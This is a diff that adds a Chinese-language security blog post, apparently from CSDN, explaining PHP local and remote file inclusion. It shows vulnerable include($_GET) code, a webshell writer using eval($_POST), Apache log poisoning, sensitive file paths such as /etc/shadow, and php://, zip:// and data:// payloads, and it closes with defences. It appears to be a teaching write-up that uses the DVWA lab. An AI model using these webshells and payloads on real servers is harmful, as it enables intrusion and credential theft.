@@ -1,0 +1,137 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-tomorrow-night-eighties" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<p></p>
+<div class="toc">
+<h3>文件包含漏洞总结</h3>
+<ul><li><a href="#_1">一、什么是文件包含漏洞</a></li><li><a href="#LFI_48">二、本地文件包含漏洞(LFI)</a></li><li><a href="#LFI_93">三、LFI漏洞利用技巧</a></li><li><ul><li><a href="#1_94">1.配合文件上传使用</a></li><li><a href="#2Apache_118">2.包含Apache日志文件</a></li><li><a href="#3SESSION_148">3.包含SESSION文件</a></li><li><a href="#4_168">4.包含临时文件</a></li></ul>
+</li><li><a href="#RFI_179">四、远程文件包含(RFI)</a></li><li><a href="#PHP_203">五、PHP伪协议</a></li><li><ul><li><a href="#1file_208">1.file://协议</a></li><li><a href="#2php_214">2.php://协议</a></li><li><a href="#3ZIP_245">3.ZIP://协议</a></li><li><a href="#4data_265">4.data://协议</a></li><li><a href="#5_284">5.伪协议利用条件</a></li></ul>
+</li><li><a href="#_289">六、文件包含漏洞防护</a></li></ul>
+</div>
+<p></p>
+<h1><a id="_1"></a>一、什么是文件包含漏洞</h1>
+<p><strong>1.文件包含漏洞概述</strong><br/> 和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例,常用的文件包含函数有以下四种<br/> include(),require(),include_once(),require_once()</p>
+<p>区别如下:</p>
+<ul><li>require():找不到被包含的文件会产生致命错误，并停止脚本运行</li><li>include():找不到被包含的文件只会产生警告，脚本继续执行</li><li>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li><li>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li></ul>
+<p><strong>2.漏洞成因分析</strong><br/> 我们先直接来看一个简单的例子，网页代码如下:</p>
+<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+	include $_GET<span class="token punctuation">[</span><span class="token char">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>在创建一个phpinfo.php页面，代码如下:</p>
+<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dc778ffd8e524b70ac75079a7827fed8.png"/><br/> 将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/018bfc3e1e3d42d6800be4e4d86a33ab.png"/><br/> 将phpinfo.php文件后缀改为jpg格式，也可以解析:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6505b63d46cb412f8d5bccddf7c3943d.png"/><br/> 可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。</p>
+<p>在上一期的文件上传漏洞的总结中，我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用。</p>
+<p>现在我们将phpinfo.jpg的内容改成一段文字:<code>hello world!</code><br/> 再次进行访问，可以读出文本内容<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5d6785d8b9444d4289e6d0091749fc92.png"/><br/> 利用这个特性，我们可以读取一下包含敏感信息的文件。</p>
+<h1><a id="LFI_48"></a>二、本地文件包含漏洞(LFI)</h1>
+<p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br/> 测试网页包含如下代码:</p>
+<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+	$file<span class="token operator">=</span>$_GET<span class="token punctuation">[</span>'filename'<span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token function">include</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>网站利用文件包含功能读取一些php文件，例如phpinfo:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cbc0f2c94dd84c7db45f3ece931e174f.png"/><br/> 利用该代码，我们可以读取一些系统本地的敏感信息。<br/> 例如:<code>C:\Windows\system.ini</code>文件。<br/> （1）使用绝对路径<br/> 使用绝对路径直接读取:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5b328aeec88c47b692ea9d4f6f576687.png"/><br/> （2）使用相对路径进行读取<br/> 通过./表示当前位置路径，…/表示上一级路径位置，在linux中同样适用。</p>
+<p>例如当前页面所在路径为C:\Apache24\htdocs\，我们需要使用…/退到C盘再进行访问，构造路径如下：<br/> <code>../../windows/system.ini</code></p>
+<p>由于我的环境搭建在D盘，所以这里就不做演示了。</p>
+<p>（3）一些常见的敏感目录信息路径:<br/> Windows系统:</p>
+<ul><li>C:\boot.ini //查看系统版本</li><li>C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件</li><li>C:\windows\repair\sam //存储Windows系统初次安装的密码</li><li>C:\ProgramFiles\mysql\my.ini //Mysql配置</li><li>C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码</li><li>C:\windows\php.ini //php配置信息</li></ul>
+<p>Linux/Unix系统:</p>
+<ul><li>/etc/password //账户信息</li><li>/etc/shadow //账户密码信息</li><li>/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件</li><li>/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置</li><li>/usr/local/app/php5/lib/php.ini //PHP相关配置</li><li>/etc/httpd/conf/httpd.conf //Apache配置文件</li><li>/etc/my.conf //mysql配置文件</li></ul>
+<h1><a id="LFI_93"></a>三、LFI漏洞利用技巧</h1>
+<h2><a id="1_94"></a>1.配合文件上传使用</h2>
+<p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
+<p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p>
+<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>'<span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>找到上传点进行上传：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bf2eedc3da474531b1917d7763177fa1.png"/><br/> 文件保存的完整路径为：</p>
+<p>DVWA平台low等级文件包含漏洞页面如下：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1e9282b639c74eab91df6ec0a00bb71c.png"/><br/> 该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件，代码如下：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ed307a7351224820a6cae2d47c00a986.png"/><br/> 现在我们利用该页面去执行我们上传的图片马</p>
+<p>构造URL如下，代码成功解析，我这里使用的phpinfo进行测试，实战直接替换为上述所写的一句话木马即可。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8d87a140896c4f648af950504440c1f3.png"/><br/> 注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
+<h2><a id="2Apache_118"></a>2.包含Apache日志文件</h2>
+<p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d846bd86ec7c4c2ea2ec727636377080.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/23f04c88b7ff4ef7b4c58f7d3e1af569.png"/></p>
+<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/556a0cf2f645493e8dc99b0e8cb6b1b3.png"/><br/> 当我们正常访问一个网页时，如`http://127.0.0.1/phpinfo.php，access日志会进行记录，如下图所示:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2b58a94436aa410296870232d8eada4c.png"/></p>
+<p>如果我们访问一个不存在的资源，也一样会进行记录，例如访问</p>
+<pre><code class="prism language-java"><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>网页会显示403<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2517980983d04e779fa5a63b1ccf14d7.png"/><br/> 但查看日志会发现被成功记录但被编码了，如下:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6cb87add8bec4e42b1e0fb98510c60c2.png"/><br/> 我们再次进行访问，并使用burp抓包，发现被编码：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/764770d5b4194696a4e53ee90ae5f8ff.png"/><br/> 我们将报文修改回去，再进行发送即可：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/457157023bde4a1594824c7bb43c1147.png"/><br/> 此时再查看access日志，正确写入php代码：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ce659f048e6a497588b4349d8784cd62.png"/><br/> 再通过本地文件包含漏洞访问，即可执行<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b7dda564404144989c26bd158d3e6e45.png"/><br/> 我们可以在此处写入一句话木马，再使用webshell管理工具进行连接。</p>
+<h2><a id="3SESSION_148"></a>3.包含SESSION文件</h2>
+<p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<p><strong>利用条件:</strong></p>
+<ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/befb18bcc73040d48f8530cf9af51a2c.png"/><br/> <strong>session常见存储路径:</strong></p>
+<ul><li>/var/lib/php/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li><li>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。</li></ul>
+<p>相关案例可以查看这道CTF题<a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道CTF题：PHP文件包含</a></p>
+<h2><a id="4_168"></a>4.包含临时文件</h2>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e6618d373f0c467cb1a7fc6cb4b0046b.png"/><br/> php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
+<p>这个方法可以参考<a href="https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">LFI With PHPInfo Assistance</a><br/> 类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题： <a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup</a></p>
+<h1><a id="RFI_179"></a>四、远程文件包含(RFI)</h1>
+<p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/44c9de53ff3f4ff8b15a0c1a0fc9f96a.png"/><br/> 首先我们来看一段代码</p>
+<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+	$path<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token char">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token function">include</span><span class="token punctuation">(</span>$path <span class="token punctuation">.</span> '<span class="token operator">/</span>phpinfo<span class="token punctuation">.</span>php'<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>访问本地site目录下的phpinfo.php文件:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9234a931fc11452099398084fd606c59.png"/></p>
+<p>该页面并没有对$path做任何过滤，因此存在文件包含漏洞。</p>
+<p>我们在远端Web服务器/site/目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。</p>
+<p>但是代码会给我们输入的路径后面加上’/phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p>
+<p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5f410573f9664f12bff64166719a0592.png"/></p>
+<p>如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限。</p>
+<h1><a id="PHP_203"></a>五、PHP伪协议</h1>
+<p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数</p>
+<p>如下所示<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/30b963c25bea48dcbc496cffb05d9989.png"/></p>
+<h2><a id="1file_208"></a>1.file://协议</h2>
+<p><strong>file://</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b36518ada13d4840adda715be02c8c57.png"/><br/> file:// [文件的绝对路径和文件名]<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c7155542f0104f3588a3b809f5e30dbc.png"/></p>
+<h2><a id="2php_214"></a>2.php://协议</h2>
+<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code><br/> <strong>php://filter用于读取源码</strong>。<br/> <strong>php://input用于执行php代码</strong>。</p>
+<p><strong>php://filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br/> <strong>利用条件:</strong></p>
+<ul><li>allow_url_fopen ：off/on</li><li>allow_url_include：off/on</li></ul>
+<p>例如有一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码是不会显示在页面上的，例如打开当前目录下的2.php:<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/82059d24101a403b9f3b8e7769e4cf9f.png"/><br/> 他只显示了一条语句，这时候我们可以以base64编码的方式读取指定文件的源码:</p>
+<p>输入<br/> <code>php://filter/convert.base64-encode/resource=文件路径</code><br/> 得到2.php加密后的源码：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b667bf338aab4e82bcf72ad77472b3f0.png"/><br/> 再进行base64解码，获取到2.php的完整源码信息：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/65f354f2a2774be9b74c3f3940b8e0b3.png"/><br/> <strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br/> <strong>利用条件:</strong></p>
+<ul><li>allow_url_fopen ：off/on</li><li>allow_url_include：on</li></ul>
+<p>利用该方法，我们可以直接写入php文件，输入<code>file=php://input</code>，然后使用burp抓包，写入php代码：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b8cdd2c6e9a94365b64c58ef3f5c48ee.png"/><br/> 发送报文，可以看到本地生成了一句话木马：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c99b110b71cc4854a2cfc3821b6befe3.png"/></p>
+<h2><a id="3ZIP_245"></a>3.ZIP://协议</h2>
+<p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
+<ul><li>zip://中只能传入绝对路径。</li><li>要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）</li><li>只需要是zip的压缩包即可，后缀名可以任意更改。</li><li>相同的类型还有zlib://和bzip2://</li></ul>
+<p><strong>利用条件:</strong></p>
+<ul><li>allow_url_fopen ：off/on</li><li>allow_url_include：off/on</li></ul>
+<p>POC为：</p>
+<pre><code class="prism language-java">zip<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">[</span>压缩包绝对路径<span class="token punctuation">]</span>#<span class="token punctuation">[</span>压缩包内文件<span class="token punctuation">]</span><span class="token operator">?</span>file<span class="token operator">=</span>zip<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token class-name">D</span><span class="token operator">:</span>\<span class="token number">1.</span>zip<span class="token operator">%</span><span class="token number">23</span>phpinfo<span class="token punctuation">.</span>txt
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7f04b0e59fda44cdb669d99fa315410b.png"/></p>
+<h2><a id="4data_265"></a>4.data://协议</h2>
+<p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br/> <strong>利用条件:</strong></p>
+<ul><li>allow_url_fopen ：on</li><li>allow_url_include：on</li></ul>
+<p>POC为:</p>
+<pre><code class="prism language-java">data<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
+<span class="token comment">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span>
+data<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>base64<span class="token punctuation">,</span><span class="token class-name">PD9waHAgcGhwaW5mbygpPz4</span><span class="token operator">=</span>
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/fdf0d4eb7b9f4b40b4e22b6990162cb8.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ef51e3405dc04622b65750b26c55eca8.png"/></p>
+<h2><a id="5_284"></a>5.伪协议利用条件</h2>
+<p>伪协议的利用方法还有很多，这里就不一一举例了。<br/> 伪协议的用法小结<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4737e3fbbbae4ebda4d419264e9e556c.png"/></p>
+<h1><a id="_289"></a>六、文件包含漏洞防护</h1>
+<p>1、使用<strong>str_replace</strong>等方法过滤掉危险字符</p>
+<p>2、配置open_basedir，防止目录遍历（<strong>open_basedir 将php所能打开的文件限制在指定的目录树中</strong>）</p>
+<p>3、php版本升级，防止%00截断</p>
+<p>4、对上传的文件进行重命名，防止被读取</p>
+<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
+<p>6、做好管理员权限划分，做好文件的权限管理，<strong>allow_url_include和allow_url_fopen最小权限化</strong></p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
